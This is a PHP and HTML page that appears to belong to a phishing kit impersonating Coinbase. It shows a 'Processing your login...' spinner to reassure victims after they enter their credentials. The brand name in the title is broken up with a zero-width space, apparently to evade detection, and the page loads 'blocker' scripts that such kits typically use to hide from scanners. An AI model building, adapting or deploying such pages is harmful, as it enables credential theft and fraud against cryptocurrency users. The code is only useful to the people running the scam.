<?php
// ==================== PROTECTION START ====================
require_once 'blocker.php';
require_once 'blocker-raw.php';

header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");
header("X-XSS-Protection: 1; mode=block");
ob_start();
// ==================== PROTECTION END ====================
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing - C&#8203;oinbase</title>
    <style>
        body {
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
        }
        .spinner {
            border: 4px solid #333;
            border-top: 4px solid #0052ff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h2>Processing your login...</h2>
        <p>Please wait while we verify your information.</p>
    </div>
</body>
</html>
<?php ob_end_flush(); ?>